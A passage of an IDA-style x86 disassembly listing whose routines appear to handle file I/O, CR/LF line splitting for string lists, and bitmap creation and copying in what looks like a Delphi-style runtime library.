                mov     ebx, eax
                mov     dword ptr [ebx+28h], 405A00h
                mov     dword ptr [ebx+2Ch], 405A0Ch
                mov     dword ptr [ebx+24h], 405AECh
                mov     esi, 200h
                mov     eax, edi
                call    sub_3F9C
                test    al, al
                jz      short loc_4FBF
                mov     esi, 300h

loc_4FBF:                               ; CODE XREF: sub_4F84+34↑j
                mov     edx, esi
                or      edx, 0C0000000h
                or      edx, 1
                mov     eax, edi
                call    sub_3F68
                mov     [ebx+40h], eax
                mov     eax, ebx
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_4F84        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_4FDC        proc near               ; CODE XREF: sub_65D0:loc_672F↓p
                mov     eax, 409114h
                call    sub_4DA8
                retn
sub_4FDC        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_4FE8        proc near               ; CODE XREF: sub_6A78+1EF↓p
                push    ebx
                push    esi
                push    edi
                push    ebp
                mov     esi, ecx
                mov     ebx, edx
                mov     edi, eax
                cmp     dword ptr [ebx+3Ch], 0
                jz      short loc_501F
                mov     eax, [ebx+4Ch]
                mov     ecx, eax
                add     ecx, esi
                mov     edx, [ebx+48h]
                cmp     ecx, edx
                jbe     short loc_500A
                mov     esi, edx
                sub     esi, eax

loc_500A:                               ; CODE XREF: sub_4FE8+1C↑j
                mov     edx, [ebx+3Ch]
                add     edx, eax
                mov     eax, edi
                mov     ecx, esi
                call    sub_4D8C
                mov     esi, eax
                add     [ebx+4Ch], esi
                jmp     short loc_5078
; ---------------------------------------------------------------------------

loc_501F:                               ; CODE XREF: sub_4FE8+E↑j
                cmp     dword ptr [edi+3Ch], 0
                jz      short loc_504E
                mov     eax, [edi+4Ch]
                add     eax, esi
                cmp     eax, [edi+48h]
                jbe     short loc_5038
                mov     edx, eax
                mov     eax, edi
                call    sub_4D80

loc_5038:                               ; CODE XREF: sub_4FE8+45↑j
                mov     edx, [edi+3Ch]
                add     edx, [edi+4Ch]
                mov     ecx, esi
                mov     eax, ebx
                call    sub_4D88
                mov     esi, eax
                add     [edi+4Ch], esi
                jmp     short loc_5078
; ---------------------------------------------------------------------------

loc_504E:                               ; CODE XREF: sub_4FE8+3B↑j
                mov     eax, esi
                call    sub_1848
                mov     ebp, eax
                mov     edx, ebp
                mov     ecx, esi
                mov     eax, ebx
                call    sub_4D88
                mov     esi, eax
                mov     edx, ebp
                mov     eax, edi
                mov     ecx, esi
                call    sub_4D8C
                mov     esi, eax
                mov     eax, ebp
                call    sub_1868

loc_5078:                               ; CODE XREF: sub_4FE8+35↑j
                                        ; sub_4FE8+64↑j
                mov     eax, esi
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_4FE8        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_5080        proc near               ; CODE XREF: sub_4A34+3D↑p
                                        ; sub_6ED0+24↓p ...
                mov     edx, ds:404440h
                xor     eax, eax
                call    sub_38F8
                retn
sub_5080        endp

; ---------------------------------------------------------------------------
                align 10h
                push    eax
                call    sub_50BC
                pop     eax
                call    sub_392C
                retn
; ---------------------------------------------------------------------------
                align 10h
                mov     dl, ds:4090ACh
                mov     [eax+29h], dl
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_50AC        proc near               ; CODE XREF: sub_4A34+60↑p
                                        ; sub_6ED0+80↓p
                mov     ecx, edx
                mov     edx, [eax+1Ch]
                push    edx
                call    sub_51C4
                pop     eax
                retn
sub_50AC        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_50BC        proc near               ; CODE XREF: CODE:00005091↑p
                                        ; sub_5294+5↓p
                push    ebx
                xchg    eax, ebx
                mov     edx, [ebx+1Ch]

loc_50C1:                               ; CODE XREF: sub_50BC+11↓j
                dec     edx
                jl      short loc_50CF
                push    edx
                mov     eax, ebx
                call    sub_50EC
                pop     edx
                jmp     short loc_50C1
; ---------------------------------------------------------------------------

loc_50CF:                               ; CODE XREF: sub_50BC+6↑j
                xor     eax, eax
                mov     [ebx+25h], eax
                xchg    eax, [ebx+21h]
                test    eax, eax
                jz      short loc_50E0
                call    sub_1868

loc_50E0:                               ; CODE XREF: sub_50BC+1D↑j
                xchg    eax, [ebx+18h]
                call    sub_3920
                pop     ebx
                retn
sub_50BC        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_50EC        proc near               ; CODE XREF: sub_50BC+B↑p
                                        ; sub_7290+BF↓p ...
                dec     dword ptr [eax+1Ch]
                push    eax
                mov     eax, [eax+18h]
                mov     ecx, [eax+18h]
                push    dword ptr [ecx+edx*4]
                call    sub_3A18
                pop     eax
                pop     edx
                mov     ecx, [edx+25h]
                jecxz   short loc_5111
                cmp     eax, [edx+21h]
                jb      short loc_5111
                add     ecx, [edx+21h]
                cmp     eax, ecx
                jb      short locret_5116

loc_5111:                               ; CODE XREF: sub_50EC+17↑j
                                        ; sub_50EC+1C↑j
                call    sub_1868

locret_5116:                            ; CODE XREF: sub_50EC+23↑j
                retn
sub_50EC        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_5118        proc near               ; CODE XREF: sub_7290+A9↓p
                                        ; sub_7290+DB↓p ...
                push    ecx
                mov     eax, [eax+18h]
                test    eax, eax
                jz      short loc_5125
                call    sub_3A5C

loc_5125:                               ; CODE XREF: sub_5118+6↑j
                xchg    eax, edx
                pop     eax
                jmp     sub_25C4
sub_5118        endp

; ---------------------------------------------------------------------------
                retn
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_5130        proc near               ; CODE XREF: sub_5250+17↓p
                push    esi
                push    edi
                mov     ecx, [eax+1Ch]
                mov     eax, [eax+18h]
                push    ecx
                jecxz   short loc_513E
                mov     esi, [eax+18h]

loc_513E:                               ; CODE XREF: sub_5130+9↑j
                push    esi
                xchg    eax, edx
                xor     edx, edx
                jecxz   short loc_515A
                push    eax

loc_5145:                               ; CODE XREF: sub_5130+23↓j
                push    ecx
                push    edx
                lodsd
                call    sub_3D3C
                pop     edx
                lea     edx, [eax+edx+2]
                pop     ecx
                loop    loc_5145
                pop     eax
                pop     esi
                xchg    ecx, edx
                push    eax

loc_515A:                               ; CODE XREF: sub_5130+12↑j
                call    sub_2584
                pop     edi
                pop     ecx
                jecxz   short loc_517E
                mov     edi, [edi]

loc_5165:                               ; CODE XREF: sub_5130+4A↓j
                push    ecx
                lodsd
                push    eax
                call    sub_3D3C
                xchg    eax, ecx
                pop     eax
                xchg    eax, esi
                rep movsb
                xchg    eax, esi
                mov     ax, 0A0Dh
                stosw
                pop     ecx
                loop    loc_5165
                xchg    eax, ecx
                stosb

loc_517E:                               ; CODE XREF: sub_5130+31↑j
                pop     edi
                pop     esi
                retn
sub_5130        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_5184        proc near               ; CODE XREF: sub_6ED0+72↓p
                push    ebx
                push    esi
                push    edi
                push    ebp
                mov     ebp, edx
                mov     edi, eax
                mov     ebx, [edi+1Ch]
                dec     ebx
                test    ebx, ebx
                jl      short loc_51B7
                inc     ebx
                xor     esi, esi

loc_5197:                               ; CODE XREF: sub_5184+31↓j
                mov     eax, [edi+18h]
                mov     edx, esi
                call    sub_3A5C
                push    eax
                mov     eax, ebp
                call    sub_280C
                pop     edx
                call    sub_3CF8
                test    eax, eax
                jz      short loc_51BA
                inc     esi
                dec     ebx
                jnz     short loc_5197

loc_51B7:                               ; CODE XREF: sub_5184+E↑j
                or      esi, 0FFFFFFFFh

loc_51BA:                               ; CODE XREF: sub_5184+2D↑j
                mov     eax, esi
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_5184        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_51C4        proc near               ; CODE XREF: sub_50AC+6↑p
                push    ebx
                push    edx
                push    ecx
                xchg    eax, ebx
                mov     eax, [ebx+18h]
                test    eax, eax
                jnz     short loc_51D7
                call    sub_396C
                mov     [ebx+18h], eax

loc_51D7:                               ; CODE XREF: sub_51C4+9↑j
                pop     eax
                push    eax
                call    sub_260C
                inc     eax
                push    eax
                call    sub_1848
                mov     byte ptr [eax], 0
                xchg    eax, edx
                pop     ecx
                pop     eax
                push    edx
                test    eax, eax
                jz      short loc_51F5
                call    sub_194C

loc_51F5:                               ; CODE XREF: sub_51C4+2A↑j
                pop     ecx
                pop     edx
                mov     eax, [ebx+18h]
                call    sub_3A70
                inc     dword ptr [ebx+1Ch]
                pop     ebx
                retn
sub_51C4        endp


; =============== S U B R O U T I N E =======================================


sub_5204        proc near               ; CODE XREF: sub_6ED0+67↓p
                                        ; sub_7290+98↓p
                push    eax
                xchg    eax, edx
                mov     edx, 80000301h
                call    sub_3F68
                inc     eax
                jz      short loc_524D
                dec     eax
                push    ebx
                xchg    eax, ebx
                push    0
                push    ebx
                call    sub_3478
                xor     edx, edx
                push    edx
                xchg    eax, ecx
                mov     eax, esp
                push    ecx
                call    sub_2584
                pop     ecx
                mov     eax, ebx
                pop     edx
                push    edx
                call    sub_3FC4
                xchg    eax, ebx
                call    sub_3F90
                pop     edx
                pop     ebx
                pop     eax
                push    edx
                xor     ecx, ecx
                call    sub_5294
                call    sub_38A8
                push    edx
                mov     al, 1

loc_524D:                               ; CODE XREF: sub_5204+D↑j
                pop     edx
                retn
sub_5204        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_5250        proc near               ; CODE XREF: sub_6ED0+B2↓p
                                        ; sub_7290+153↓p
                push    ebx
                push    eax
                xchg    eax, edx
                mov     edx, 40000400h
                call    sub_3F68
                inc     eax
                jz      short loc_5290
                dec     eax
                xchg    eax, ebx
                pop     eax
                push    0
                mov     edx, esp
                call    sub_5130
                pop     eax
                push    eax
                call    sub_260C
                xchg    eax, ecx
                pop     edx
                push    edx
                mov     eax, ebx
                call    sub_3FE0
                push    ebx
                call    sub_34D0
                xchg    eax, ebx
                call    sub_3F90
                call    sub_38A8
                push    edx
                inc     eax

loc_5290:                               ; CODE XREF: sub_5250+E↑j
                pop     edx
                pop     ebx
                retn
sub_5250        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_5294        proc near               ; CODE XREF: sub_5204+3C↑p
                dec     cl
                jz      short loc_529F
                pusha
                call    sub_50BC
                popa

loc_529F:                               ; CODE XREF: sub_5294+2↑j
                call    sub_389C
                jz      locret_536D
                push    ebx
                push    edi
                mov     ebx, eax
                mov     edi, [ebx+25h]
                mov     eax, [edx-4]
                inc     eax
                push    eax
                push    edx
                push    dword ptr [ebx+21h]
                add     eax, [ebx+25h]
                call    sub_1848
                mov     [ebx+21h], eax
                mov     ecx, edi
                xchg    eax, edx
                pop     eax
                jecxz   short loc_52F4
                push    eax
                call    sub_194C
                pop     edx
                push    edx
                push    esi
                mov     esi, [ebx+18h]
                mov     esi, [esi+18h]
                mov     ecx, [ebx+1Ch]

loc_52DD:                               ; CODE XREF: sub_5294:loc_52EB↓j
                lodsd
                sub     eax, edx
                cmp     eax, [ebx+25h]
                jnb     short loc_52EB
                add     eax, [ebx+21h]
                mov     [esi-4], eax

loc_52EB:                               ; CODE XREF: sub_5294+4F↑j
                loop    loc_52DD
                pop     esi
                pop     eax
                call    sub_1868

loc_52F4:                               ; CODE XREF: sub_5294+35↑j
                pop     eax
                mov     edx, edi
                add     edx, [ebx+21h]
                pop     ecx
                push    ecx
                add     [ebx+25h], ecx
                call    sub_194C
                add     edi, [ebx+21h]
                mov     ecx, [ebx+18h]
                inc     ecx
                loop    loc_5315
                call    sub_396C
                mov     [ebx+18h], eax

loc_5315:                               ; CODE XREF: sub_5294+77↑j
                pop     ecx
                mov     edx, [ebx+1Ch]
                push    edi
                push    ecx
                mov     al, 0Dh

loc_531D:                               ; CODE XREF: sub_5294+96↓j
                                        ; sub_5294+99↓j
                cmp     byte ptr [edi], 0
                jz      short loc_532F
                inc     edx
                repne scasb
                jnz     short loc_532F
                cmp     byte ptr [edi], 0Ah
                jnz     short loc_531D
                inc     edi
                loop    loc_531D

loc_532F:                               ; CODE XREF: sub_5294+8C↑j
                                        ; sub_5294+91↑j
                mov     [ebx+1Ch], edx
                mov     eax, [ebx+18h]
                push    edx
                push    eax
                cmp     edx, [eax+20h]
                jle     short loc_5341
                call    sub_39B4

loc_5341:                               ; CODE XREF: sub_5294+A6↑j
                pop     eax
                pop     ecx
                xchg    ecx, [eax+1Ch]
                mov     edx, [eax+18h]
                lea     edx, [edx+ecx*4]
                pop     ecx
                pop     edi
                mov     eax, 0Dh

loc_5353:                               ; CODE XREF: sub_5294+D2↓j
                                        ; sub_5294+D5↓j
                cmp     [edi], ah
                jz      short loc_536B
                mov     [edx], edi
                add     edx, 4
                repne scasb
                jnz     short loc_536B
                mov     [edi-1], ah
                cmp     byte ptr [edi], 0Ah
                jnz     short loc_5353
                inc     edi
                loop    loc_5353

loc_536B:                               ; CODE XREF: sub_5294+C1↑j
                                        ; sub_5294+CA↑j
                pop     edi
                pop     ebx

locret_536D:                            ; CODE XREF: sub_5294+10↑j
                retn
sub_5294        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_5370        proc near               ; CODE XREF: sub_567C+125↓p
                push    edi
                push    ecx
                push    edx
                push    eax
                mov     eax, 428h
                call    sub_3BF0
                mov     edi, eax
                xchg    eax, ecx
                xor     eax, eax
                mov     al, 28h ; '('
                stosd
                pop     eax
                stosd
                pop     eax
                stosd
                xor     eax, eax
                inc     eax
                stosw
                pop     eax
                stosw
                xchg    eax, ecx
                pop     edi
                retn
sub_5370        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_5398        proc near               ; CODE XREF: sub_5618+3C↓p
                                        ; sub_588C+1A↓p
                push    esi
                mov     esi, 409135h
                xor     ecx, ecx
                xchg    eax, edx

loc_53A1:                               ; CODE XREF: sub_5398+11↓j
                inc     ecx
                lodsb
                cmp     al, dl
                jz      short loc_53AB
                test    al, al
                jnz     short loc_53A1

loc_53AB:                               ; CODE XREF: sub_5398+D↑j
                xchg    eax, ecx
                pop     esi
                retn
sub_5398        endp

; ---------------------------------------------------------------------------
                align 10h
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_53B4        proc near               ; CODE XREF: sub_53D8+2↓p
                push    ebx
                push    esi
                mov     esi, edx
                mov     ebx, eax
                mov     edx, ds:404454h
                xor     eax, eax
                call    sub_38F8
                mov     dword ptr [eax+34h], 405FB0h
                mov     [eax+1Ch], ebx
                mov     [eax+18h], esi
                pop     esi
                pop     ebx
                retn
sub_53B4        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_53D8        proc near               ; CODE XREF: sub_5A38+66↓p
                                        ; sub_5A38+72↓p
                push    eax
                push    edx
                call    sub_53B4
                pop     edx
                pop     ecx
                push    eax
                inc     byte ptr [eax+3Ch]
                jecxz   short loc_540A
                test    edx, edx
                jz      short loc_540A
                push    ebx
                push    eax
                push    edx
                push    ecx
                push    0
                call    sub_3578
                push    eax
                xchg    eax, ebx
                call    sub_3500
                pop     edx
                mov     [edx+20h], eax
                push    ebx
                push    0
                call    sub_3590
                pop     ebx

loc_540A:                               ; CODE XREF: sub_53D8+D↑j
                                        ; sub_53D8+11↑j
                pop     eax
                retn
sub_53D8        endp


; =============== S U B R O U T I N E =======================================


sub_540C        proc near               ; CODE XREF: sub_567C+131↓p
                mov     byte ptr [eax+10h], 3
                add     eax, 28h ; '('
                xchg    eax, edx
                mov     eax, 409140h
                xor     ecx, ecx
                mov     cl, 4Ch ; 'L'
                call    sub_194C
                retn
sub_540C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_5424        proc near               ; CODE XREF: sub_5468+8↓p
                                        ; sub_567C+FC↓p ...
                push    ebx
                mov     ebx, eax
                call    dword ptr [ebx+34h]
                xor     ecx, ecx
                xchg    ecx, [ebx+20h]
                jecxz   short loc_543C
                push    ecx
                call    sub_3528
                xor     ecx, ecx
                mov     [ebx+41h], ecx

loc_543C:                               ; CODE XREF: sub_5424+B↑j
                xchg    ecx, [ebx+41h]
                jecxz   short loc_5447
                xchg    eax, ecx
                call    sub_1868

loc_5447:                               ; CODE XREF: sub_5424+1B↑j
                xor     ecx, ecx
                xchg    ecx, [ebx+3Dh]
                jecxz   short loc_5454
                xchg    eax, ecx
                call    sub_1868

loc_5454:                               ; CODE XREF: sub_5424+28↑j
                xor     eax, eax
                mov     [ebx+28h], eax
                mov     [ebx+56h], eax
                mov     [ebx+5Ah], eax
                xchg    eax, ebx
                pop     ebx
                call    sub_58BC
                retn
sub_5424        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_5468        proc near               ; CODE XREF: CODE:00005485↓p
                                        ; sub_55E0+2↓p
                push    eax
                call    sub_586C
                pop     eax
                push    eax
                call    sub_5424
                pop     eax
                xor     edx, edx
                mov     [eax+1Ch], edx
                mov     [eax+18h], edx
                mov     [eax+72h], dl
                retn
sub_5468        endp

; ---------------------------------------------------------------------------
                align 4
                push    eax
                call    sub_5468
                pop     eax
                call    sub_392C
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_5494        proc near               ; CODE XREF: sub_567C+F0↓p
                                        ; sub_567C+1B0↓p

var_10          = dword ptr -10h

; FUNCTION CHUNK AT 000054FA SIZE 00000047 BYTES

                push    ebp
                mov     ebp, esp
                push    edx
                push    ecx
                push    ebx
                push    esi

loc_549B:                               ; CODE XREF: sub_5494+9F↓j
                mov     ebx, eax
                call    sub_5544
                jz      loc_5539
                mov     ecx, [ebx+20h]
                jecxz   short loc_54FA
                add     esp, 0FFFFFFE8h
                push    esp
                push    18h
                push    dword ptr [ebx+20h]
                call    sub_3538
                test    eax, eax
                mov     esi, [esp+18h+var_10]
                jnz     short loc_54C6
                mov     esi, [ebx+18h]

loc_54C6:                               ; CODE XREF: sub_5494+2D↑j
                add     esp, 18h
                call    sub_38B8
                push    0CC0020h
                push    0
                push    0
                push    eax
                call    sub_54E9
                call    sub_34F8
                call    sub_38E0
                jmp     short loc_5539
sub_5494        endp


; =============== S U B R O U T I N E =======================================


sub_54E9        proc near               ; CODE XREF: sub_5494+44↑p
                                        ; sub_5494+87↓p
                xchg    esi, [esp+0]
                push    dword ptr [ebx+1Ch]
                push    dword ptr [ebp+8]
                push    dword ptr [ebp-8]
                push    dword ptr [ebp-4]
                jmp     esi
sub_54E9        endp

; ---------------------------------------------------------------------------
; START OF FUNCTION CHUNK FOR sub_5494

loc_54FA:                               ; CODE XREF: sub_5494+17↑j
                mov     ecx, [ebx+3Dh]
                jecxz   short loc_5539
                mov     esi, [ecx+8]
                test    esi, esi
                jge     short loc_5508
                neg     esi

loc_5508:                               ; CODE XREF: sub_5494+70↑j
                push    0CC0020h
                push    0
                push    ecx
                push    dword ptr [ebx+41h]
                push    esi
                push    dword ptr [ebx+1Ch]
                push    0
                push    0
                call    sub_54E9
                call    sub_3550
                test    eax, eax
                jnz     short loc_5539
                mov     eax, ebx
                call    sub_5554
                test    eax, eax
                xchg    eax, ebx
                jnz     loc_549B

loc_5539:                               ; CODE XREF: sub_5494+E↑j
                                        ; sub_5494+53↑j ...
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    4
; END OF FUNCTION CHUNK FOR sub_5494
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_5544        proc near               ; CODE XREF: sub_5494+9↑p
                                        ; sub_5554+9↓p ...
                push    ecx
                mov     ecx, [eax+1Ch]
                jecxz   short loc_554D
                mov     ecx, [eax+18h]

loc_554D:                               ; CODE XREF: sub_5544+4↑j
                test    ecx, ecx
                pop     ecx
                setz    al
                retn
sub_5544        endp


; =============== S U B R O U T I N E =======================================


sub_5554        proc near               ; CODE XREF: sub_38B8+11↑p
                                        ; sub_5494+97↑p ...
                push    ebx
                push    esi
                push    edi
                mov     ebx, eax
                xor     esi, esi
                mov     eax, ebx
                call    sub_5544
                test    al, al
                jnz     short loc_55D8
                cmp     dword ptr [ebx+20h], 0
                jnz     short loc_55D5
                mov     eax, [ebx+41h]
                test    eax, eax
                jz      short loc_55D5
                mov     edi, eax
                push    0
                call    sub_3578
                mov     esi, eax
                xor     eax, eax
                mov     [ebx+41h], eax
                push    0
                push    0
                lea     eax, [ebx+41h]
                push    eax
                push    0
                mov     eax, [ebx+3Dh]
                push    eax
                push    esi
                call    sub_3510
                mov     [ebx+20h], eax
                push    esi
                push    0
                call    sub_3590
                cmp     dword ptr [ebx+20h], 0
                jz      short loc_55D2
                mov     ecx, [ebx+45h]
                mov     edx, [ebx+41h]
                mov     eax, edi
                call    sub_194C
                cmp     byte ptr [ebx+72h], 0
                jnz     short loc_55C2
                mov     eax, edi
                call    sub_1868

loc_55C2:                               ; CODE XREF: sub_5554+65↑j
                mov     byte ptr [ebx+72h], 1
                xor     eax, eax
                mov     [ebx+56h], eax
                xor     eax, eax
                mov     [ebx+5Ah], eax
                jmp     short loc_55D5
; ---------------------------------------------------------------------------

loc_55D2:                               ; CODE XREF: sub_5554+52↑j
                mov     [ebx+41h], edi

loc_55D5:                               ; CODE XREF: sub_5554+16↑j
                                        ; sub_5554+1D↑j ...
                mov     esi, [ebx+20h]

loc_55D8:                               ; CODE XREF: sub_5554+10↑j
                mov     eax, esi
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_5554        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_55E0        proc near               ; CODE XREF: sub_5A38+124↓p
                                        ; sub_5A38+349↓p ...

var_4           = dword ptr -4

                push    eax
                push    edx
                call    sub_5468
                pop     ecx
                jecxz   short loc_5614
                push    ecx
                add     esp, 0FFFFFFE8h
                push    esp
                push    18h
                push    ecx
                call    sub_3538
                pop     edx
                pop     edx
                pop     ecx
                add     esp, 0Ch
                test    eax, eax
                pop     eax
                jz      short loc_5614
                xchg    eax, [esp+4+var_4]
                mov     [eax+1Ch], edx
                mov     [eax+18h], ecx
                pop     edx
                mov     [eax+20h], edx
                mov     byte ptr [eax+3Ch], 1
                push    eax

loc_5614:                               ; CODE XREF: sub_55E0+8↑j
                                        ; sub_55E0+20↑j
                pop     eax
                retn
sub_55E0        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_5618        proc near               ; CODE XREF: sub_5A38+194↓p
                                        ; sub_5A38+1AC↓p ...
                push    ebx
                mov     ebx, eax
                call    sub_5544
                jz      short loc_565D
                mov     eax, ebx
                push    edx
                call    sub_588C
                pop     edx
                cmp     eax, edx
                jz      short loc_565D
                test    edx, edx
                mov     eax, ebx
                jnz     short loc_563C
                pop     ebx
                inc     edx
                jmp     sub_587C
; ---------------------------------------------------------------------------

loc_563C:                               ; CODE XREF: sub_5618+1B↑j
                mov     [ebx+49h], dl
                cmp     dl, 5
                jnz     short loc_5645
                dec     edx

loc_5645:                               ; CODE XREF: sub_5618+2A↑j
                push    edx
                xor     edx, edx
                call    sub_587C
                mov     eax, [ebx+3Dh]
                movzx   eax, word ptr [eax+0Eh]
                call    sub_5398
                pop     edx
                cmp     al, dl
                xchg    eax, ebx

loc_565D:                               ; CODE XREF: sub_5618+8↑j
                                        ; sub_5618+15↑j
                pop     ebx
                jnz     sub_567C
                retn
sub_5618        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_5668        proc near               ; CODE XREF: sub_567C+138↓p
                movzx   edx, word ptr [eax+0Eh]
                mov     eax, [eax+4]
                mul     edx
                add     eax, 1Fh
                shr     eax, 3
                and     eax, 0FFFFFFFCh
                retn
sub_5668        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_567C        proc near               ; CODE XREF: sub_5618+46↑j
                                        ; sub_587C+8↓p

var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4

                push    eax
                call    sub_5544
                pop     eax
                jz      locret_586B
                pusha
                mov     ebx, eax
                call    dword ptr [ebx+34h]
                xor     eax, eax
                mov     [ebx+28h], eax
                mov     [ebx+56h], eax
                mov     [ebx+5Ah], eax
                mov     esi, [ebx+1Ch]
                mov     edi, [ebx+18h]
                mov     ecx, [ebx+41h]
                jecxz   short loc_56B6
                mov     eax, [ebx+3Dh]
                mov     esi, [eax+4]
                mov     edi, [eax+8]
                test    edi, edi
                jge     short loc_56D5
                neg     edi
                jmp     short loc_56D5
; ---------------------------------------------------------------------------

loc_56B6:                               ; CODE XREF: sub_567C+27↑j
                mov     ecx, [ebx+20h]
                jecxz   short loc_56D5
                add     esp, 0FFFFFFE8h
                push    esp
                push    18h
                push    ecx
                call    sub_3538
                xchg    eax, ecx
                jecxz   short loc_56D2
                mov     esi, [esp+18h+var_14]
                mov     edi, [esp+18h+var_10]

loc_56D2:                               ; CODE XREF: sub_567C+4C↑j
                add     esp, 18h

loc_56D5:                               ; CODE XREF: sub_567C+34↑j
                                        ; sub_567C+38↑j ...
                push    0
                call    sub_3508
                push    eax
                cmp     byte ptr [ebx+3Ch], 1
                jnz     loc_5785
                push    0
                call    sub_3578
                push    eax
                push    dword ptr [ebx+18h]
                push    dword ptr [ebx+1Ch]
                push    eax
                call    sub_3500
                xchg    eax, ebp
                push    0
                call    sub_3590
                pop     edx
                push    edx
                push    ebp
                push    edx
                call    sub_3540
                push    eax
                push    dword ptr [ebx+18h]
                push    dword ptr [ebx+1Ch]
                push    0
                push    0
                mov     eax, [ebx+2Ch]
                call    sub_3A9C
                push    eax
                call    sub_3518
                mov     edx, esp
                push    eax
                push    eax
                push    edx
                push    [esp+38h+var_18]
                call    sub_3570
                call    sub_3528
                add     esp, 10h
                mov     ecx, [ebx+41h]
                jecxz   short loc_5762
                push    [esp+1Ch+var_18]
                call    sub_3540
                push    0
                push    dword ptr [ebx+3Dh]
                push    dword ptr [ebx+41h]
                push    dword ptr [ebx+18h]
                push    0
                push    ebp
                push    [esp+38h+var_20]
                call    sub_3548
                jmp     short loc_5776
; ---------------------------------------------------------------------------

loc_5762:                               ; CODE XREF: sub_567C+C2↑j
                mov     edx, [esp+1Ch+var_18]
                push    edx
                mov     eax, ebx
                xor     ecx, ecx
                push    ecx
                call    sub_5494
                call    sub_3540

loc_5776:                               ; CODE XREF: sub_567C+E4↑j
                mov     eax, ebx
                call    sub_5424
                mov     [ebx+20h], ebp
                jmp     loc_5858
; ---------------------------------------------------------------------------

loc_5785:                               ; CODE XREF: sub_567C+65↑j
                movzx   eax, byte ptr [ebx+49h]

loc_5789:                               ; CODE XREF: sub_567C+11B↓j
                xchg    eax, ecx
                mov     cl, [ecx+409188h]
                movzx   eax, byte ptr ds:4090B0h
                jecxz   short loc_5789
                xor     ebp, ebp
                mov     eax, [ebx+1Ch]
                mov     edx, [ebx+18h]
                call    sub_5370
                push    eax
                cmp     byte ptr [ebx+49h], 5
                jnz     short loc_57B2
                call    sub_540C

loc_57B2:                               ; CODE XREF: sub_567C+12F↑j
                pop     eax
                push    eax
                call    sub_5668
                mov     edx, [ebx+18h]
                mul     edx
                push    eax
                call    sub_1848
                push    eax
                push    0
                push    [esp+14h+var_8]
                push    eax
                mov     eax, [ebx+18h]
                cmp     eax, edi
                jle     short loc_57D5
                mov     eax, edi

loc_57D5:                               ; CODE XREF: sub_567C+155↑j
                push    eax
                push    0
                mov     eax, ebx
                call    sub_5554
                push    eax
                push    [esp+28h+var_4]
                call    sub_3530
                mov     edx, [ebx+18h]
                cmp     edx, edi
                jle     short loc_57F2
                mov     edx, edi

loc_57F2:                               ; CODE XREF: sub_567C+172↑j
                cmp     eax, edx
                jz      short loc_583A
                pop     eax
                call    sub_1868
                xor     eax, eax
                push    eax
                mov     edx, esp
                mov     ecx, [esp+2Ch+var_24]
                push    eax
                push    eax
                push    edx
                push    0
                push    ecx
                push    [esp+40h+var_20]
                call    sub_3510
                xor     esi, 0FFFFFFFFh
                xchg    eax, ebp
                push    ebp
                push    [esp+30h+var_20]
                call    sub_3540
                push    eax
                mov     edx, [esp+30h+var_20]
                xor     ecx, ecx
                push    ecx
                mov     eax, ebx
                call    sub_5494
                push    [esp+30h+var_20]
                call    sub_3540

loc_583A:                               ; CODE XREF: sub_567C+178↑j
                mov     eax, ebx
                call    sub_5424
                pop     dword ptr [ebx+41h]
                pop     dword ptr [ebx+45h]
                pop     dword ptr [ebx+3Dh]
                mov     [ebx+20h], ebp
                test    esi, esi
                mov     byte ptr [ebx+72h], 0
                jge     short loc_5858
                inc     byte ptr [ebx+72h]

loc_5858:                               ; CODE XREF: sub_567C+104↑j
                                        ; sub_567C+1D7↑j
                mov     ecx, [ebx+4Ah]
                jecxz   short loc_5865
                pop     edx
                push    edx
                push    edi
                xchg    ecx, esi
                xchg    eax, ebx
                call    esi

loc_5865:                               ; CODE XREF: sub_567C+1DF↑j
                call    sub_3520
                popa

locret_586B:                            ; CODE XREF: sub_567C+7↑j
                retn
sub_567C        endp


; =============== S U B R O U T I N E =======================================


sub_586C        proc near               ; CODE XREF: sub_5468+1↑p
                push    eax
                call    dword ptr [eax+34h]
                pop     edx
                xor     eax, eax
                xchg    eax, [edx+24h]
                call    sub_3920
                retn
sub_586C        endp


; =============== S U B R O U T I N E =======================================


